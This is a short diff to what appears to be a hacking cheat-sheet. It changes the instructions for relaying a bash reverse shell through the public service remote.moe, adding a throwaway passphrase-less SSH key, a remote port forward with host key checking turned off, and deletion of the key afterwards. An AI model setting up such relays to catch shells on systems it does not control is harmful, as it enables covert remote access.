@@ -958,7 +958,8 @@ It is possible to tunnel raw TCP (e.g bash reverse shell) through [remote.moe](h
 On your workstation:
 ```sh
 # First Terminal:
-ssh -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe
+ssh-keygen -q -t rsa -N "" -f .r
+ssh -i .r -R31337:0:8080 -o StrictHostKeyChecking=no nokey@remote.moe; rm -f .r
 # Note down the 'remote.moe' address which will look something like
 # uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe
 
